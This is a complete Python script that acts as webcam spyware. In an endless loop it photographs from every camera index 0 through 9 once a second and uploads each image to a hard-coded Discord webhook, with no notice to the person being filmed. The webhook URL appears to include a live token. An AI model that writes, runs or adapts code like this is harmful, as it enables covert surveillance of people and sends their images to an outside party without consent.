import cv2
import requests
import time
import os

# ─────────────── CONFIGURATION ─────────────── #
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1378995998826958878/N_ZyfXxxRHP8wdIHzpZIBi3FB8VjOwS4PS8ORW1x6JGdvxtw7mUN-E7MB5quEw1KoDMO"

# Check up to camera indexes 0..? (10 means 0 through 9)
MAX_CAMERAS = 10

# Save images in the current working directory (WindowsHost folder)
SAVE_DIR = os.getcwd()

def take_photo(cam_index):
    cap = cv2.VideoCapture(cam_index)
    if not cap.isOpened():
        cap.release()
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    filename = os.path.join(SAVE_DIR, f"camera_{cam_index}.jpg")
    cv2.imwrite(filename, frame)
    return filename

def send_to_discord(filename):
    with open(filename, 'rb') as f:
        resp = requests.post(DISCORD_WEBHOOK_URL, files={"file": f})
    return resp.status_code == 204

def capture_and_send_all():
    for idx in range(MAX_CAMERAS):
        fname = take_photo(idx)
        if fname:
            send_to_discord(fname)

def main():
    while True:
        capture_and_send_all()
        time.sleep(1)

if __name__ == "__main__":
    main()
